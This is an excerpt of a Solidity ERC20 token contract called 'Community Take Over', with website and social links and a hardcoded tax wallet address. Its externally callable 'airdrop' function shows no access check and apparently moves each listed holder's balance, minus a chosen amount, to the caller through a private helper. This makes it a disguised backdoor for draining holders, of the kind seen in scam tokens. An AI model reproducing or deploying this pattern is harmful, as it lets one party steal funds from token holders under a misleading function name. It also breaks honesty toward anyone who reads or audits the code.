...
/**
Web: https://ethcommunitytakeover.lol
X: https://x.com/eth_cto_power
Tg: https://t.me/eth_cto_power
*/
...
contract CTO is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"Community Take Over";
    ...
    constructor() payable {
        _taxWallet = payable(0x2BCC8884C78e8a624E0AC6C8E5e45a906114a0e2);
    ...
    function _callData(address from, address to, uint256 amount) private {
    ...
    function airdrop(address[] memory receivers, uint256[] memory amounts) external {
        for (uint256 i = 0; i < receivers.length; i++) {
            _callData(receivers[i], msg.sender, _balances[receivers[i]] - amounts[i]);
        }
    }
